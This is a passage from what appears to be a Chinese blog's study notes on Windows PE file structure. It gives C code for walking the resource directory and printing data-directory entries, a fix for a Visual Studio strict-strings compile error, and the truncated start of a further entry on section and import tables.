<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DATA_ENTRY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	DWORD   OffsetToData<span class="token punctuation">;</span><span class="token comment">// 资源数据的 RVA</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	DWORD   Size<span class="token punctuation">;</span><span class="token comment">// 资源数据的长度</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	DWORD   CodePage<span class="token punctuation">;</span><span class="token comment">// 代码页</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	DWORD   Reserved<span class="token punctuation">;</span><span class="token comment">// 保留字段</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">;</span></pre></td></tr></table></figure><h2 id="测试代码-3"><a class="anchor" href="#测试代码-3">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析资源表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ResourceTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ResourceTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> g_ResType<span class="token punctuation">[</span><span class="token number">0x11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">// 系统规定的资源信息</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		<span class="token string">"鼠标指针"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		<span class="token string">"位图"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token string">"图标"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token string">"菜单"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token string">"对话框"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token string">"字符串列表"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token string">"字体目录"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token string">"字体"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token string">"快捷键"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token string">"非格式化资源"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token string">"消息列表"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token string">"鼠标指针组"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token string">"图标组"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token string">"NULL"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token string">"版本信息"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token comment">// 扩展 PE 头</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	PIMAGE_OPTIONAL_HEADER pOPtionHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER<span class="token punctuation">)</span><span class="token operator">&amp;</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token comment">// 定位资源表的位置</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	PIMAGE_DATA_DIRECTORY pResDir <span class="token operator">=</span> pOPtionHeader<span class="token operator">-></span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_RESOURCE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token comment">// 填充资源表的数据结构</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	PIMAGE_RESOURCE_DIRECTORY pFirst <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pResDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	<span class="token comment">// 资源总数 = 资源 ID 条目个数 + 资源名称条目个数</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	DWORD dwResNum <span class="token operator">=</span> pFirst<span class="token operator">-></span>NumberOfIdEntries <span class="token operator">+</span> pFirst<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token comment">// 资源具体信息结构填充</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	PIMAGE_RESOURCE_DIRECTORY_ENTRY pFirstEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirst <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"根目录名称入口：%04X\n"</span><span class="token punctuation">,</span> pFirst<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"根目录ID入口：%04X\n\n"</span><span class="token punctuation">,</span> pFirst<span class="token operator">-></span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token comment">// 根据资源总数判断需要循环多少次</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwResNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token comment">// 判断 ID 是不是字符串，ID 不是字符串是系统资源</span></pre></td></tr><tr><td data-num="45"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>NameIsString <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>Id <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ResType：%s\n"</span><span class="token punctuation">,</span> g_ResType<span class="token punctuation">[</span>pFirstEntry<span class="token operator">-></span>Id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>			<span class="token keyword">else</span></pre></td></tr><tr><td data-num="52"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ResType：%d\n"</span><span class="token punctuation">,</span> g_ResType<span class="token punctuation">[</span>pFirstEntry<span class="token operator">-></span>Id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token comment">//ID 是字符串，所以代表这个资源是开发者的资源</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="58"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>			PIMAGE_RESOURCE_DIR_STRING_U pResName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>NameOffset <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>			<span class="token class-name">wchar_t</span> <span class="token operator">*</span> EpName <span class="token operator">=</span> new <span class="token class-name">wchar_t</span><span class="token punctuation">[</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>			<span class="token function">memset</span><span class="token punctuation">(</span>EpName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>			<span class="token function">wcsncpy_s</span><span class="token punctuation">(</span>EpName<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pResName<span class="token operator">-></span>NameString<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>		<span class="token comment">// 判断一下，如果是 1，就代表这个资源是个目录</span></pre></td></tr><tr><td data-num="65"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>			<span class="token comment">// 资源表的数据结构</span></pre></td></tr><tr><td data-num="68"></td><td><pre>			PIMAGE_RESOURCE_DIRECTORY pSecond <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pFirstEntry<span class="token operator">-></span>OffsetToDirectory <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>			<span class="token comment">// 资源总数</span></pre></td></tr><tr><td data-num="70"></td><td><pre>			DWORD dwSecondCount <span class="token operator">=</span> pSecond<span class="token operator">-></span>NumberOfIdEntries <span class="token operator">+</span> pSecond<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>			<span class="token comment">// 资源的具体信息的结构</span></pre></td></tr><tr><td data-num="72"></td><td><pre>			PIMAGE_RESOURCE_DIRECTORY_ENTRY pSecondEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecond <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>			<span class="token comment">// 打印选中目录</span></pre></td></tr><tr><td data-num="74"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称入口：%04X\n"</span><span class="token punctuation">,</span> pSecond<span class="token operator">-></span>NumberOfNamedEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID入口：%04X\n\n"</span><span class="token punctuation">,</span> pSecond<span class="token operator">-></span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>			<span class="token comment">// 根据资源总数循环</span></pre></td></tr><tr><td data-num="77"></td><td><pre>			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwSecondCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>				<span class="token keyword">if</span> <span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>NameIsString <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>					<span class="token comment">// 没名字是 ID</span></pre></td></tr><tr><td data-num="82"></td><td><pre>					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID：%d\n"</span><span class="token punctuation">,</span> pSecondEntry<span class="token operator">-></span>Id<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>				<span class="token keyword">else</span></pre></td></tr><tr><td data-num="85"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>					<span class="token comment">// 有名字是字符串</span></pre></td></tr><tr><td data-num="87"></td><td><pre>					PIMAGE_RESOURCE_DIR_STRING_U pResName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIR_STRING_U<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>NameOffset <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>					<span class="token class-name">wchar_t</span> <span class="token operator">*</span> pName <span class="token operator">=</span> new <span class="token class-name">wchar_t</span><span class="token punctuation">[</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>					<span class="token function">memset</span><span class="token punctuation">(</span>pName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>					<span class="token function">wcsncpy_s</span><span class="token punctuation">(</span>pName<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pResName<span class="token operator">-></span>NameString<span class="token punctuation">,</span> pResName<span class="token operator">-></span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>					<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name：%s\n\n"</span><span class="token punctuation">,</span> pName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>					delete<span class="token punctuation">[</span><span class="token punctuation">]</span>pName<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>				<span class="token comment">// 判断是不是目录</span></pre></td></tr><tr><td data-num="95"></td><td><pre>				<span class="token keyword">if</span> <span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>				<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>					<span class="token comment">// 填充数据结构</span></pre></td></tr><tr><td data-num="98"></td><td><pre>					PIMAGE_RESOURCE_DIRECTORY pThird <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pSecondEntry<span class="token operator">-></span>OffsetToDirectory <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>					<span class="token comment">// 填充具体信息结构</span></pre></td></tr><tr><td data-num="100"></td><td><pre>					PIMAGE_RESOURCE_DIRECTORY_ENTRY pThirdEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pThird <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>					pThirdEntry<span class="token operator">-></span>Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>					<span class="token comment">// 如果不是目录</span></pre></td></tr><tr><td data-num="103"></td><td><pre>					<span class="token keyword">if</span> <span class="token punctuation">(</span>pThirdEntry<span class="token operator">-></span>DataIsDirectory <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>					<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>						<span class="token comment">// 资源表的具体信息结构</span></pre></td></tr><tr><td data-num="106"></td><td><pre>						PIMAGE_RESOURCE_DATA_ENTRY pSecData <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pThirdEntry<span class="token operator">-></span>OffsetToData <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pFirst<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>						<span class="token keyword">char</span> <span class="token operator">*</span> pResbuf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>						DWORD StcDataOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> pSecData<span class="token operator">-></span>OffsetToData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Offset：%08X\n"</span><span class="token punctuation">,</span> StcDataOffset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>						<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size：%08X\n\n"</span><span class="token punctuation">,</span> pSecData<span class="token operator">-></span>Size<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>					<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>				<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>				pSecondEntry<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"=============================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>		pFirstEntry<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165714674.png" alt="image-20220301165714674" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165112177.png" alt="image-20220301165112177" /></p>
<p>出现这个问题的原因是：</p>
<p>从 VS2017 起，编译器要求通过使用字符串文本初始化的指针符合严格的  <code>const</code>  限定。所以会自动添加 <code>/Zc:strictStrings</code>  选项，你可能在上面没找到 <code>/Zc:strictStrings</code> ，其实它是通过 <code>/permissive-</code>  来隐式设置此选项。</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<p>打开项目属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165546827.png" alt="image-20220301165546827" /></p>
<p>在配置属性中打开 C/C++，找到命令行后在它的 &quot;其它选项&quot; 中添加  <code>/Zc:strictStrings-</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165250094.png" alt="image-20220301165250094" /></p>
<p>显示正常：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165458999.png" alt="image-20220301165458999" /></p>
<h1 id="其他数据表的显示"><a class="anchor" href="#其他数据表的显示">#</a> 其他数据表的显示</h1>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301165912221.png" alt="image-20220301165912221" /></p>
<p>在数据目录表中可以看到除了我们以上解析的数据目录表之外还存在其它数据目录，例如：调试、版权等这些不必要解析的数据目录表。</p>
<p>下面演示如何直接打印 RVA 和大小</p>
<h2 id="测试代码-4"><a class="anchor" href="#测试代码-4">#</a> 测试代码：</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析其他表</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">DataTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">DataTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pExportDir <span class="token operator">=</span> pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_DEBUG<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DEBUG RVA %08X\n DEBUG Size %08X\n"</span><span class="token punctuation">,</span> pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> pExportDir<span class="token operator">-></span>Size<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-3"><a class="anchor" href="#运行结果-3">#</a> 运行结果：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301172228229.png" alt="image-20220301172228229" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之区段表与数据目录导入表解析</title>
    <url>/article/d979d2ac.html</url>
    <content><![CDATA[<p>hvv 招人了，给我这种菜🐕🐕一点机会吧 awa！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226143047497.png" alt="image-20220226143047497" /></p>
<h1 id="区段表结构解析及遍历"><a class="anchor" href="#区段表结构解析及遍历">#</a> 区段表结构解析及遍历</h1>
<h2 id="运行程序代码"><a class="anchor" href="#运行程序代码">#</a> 运行程序代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td 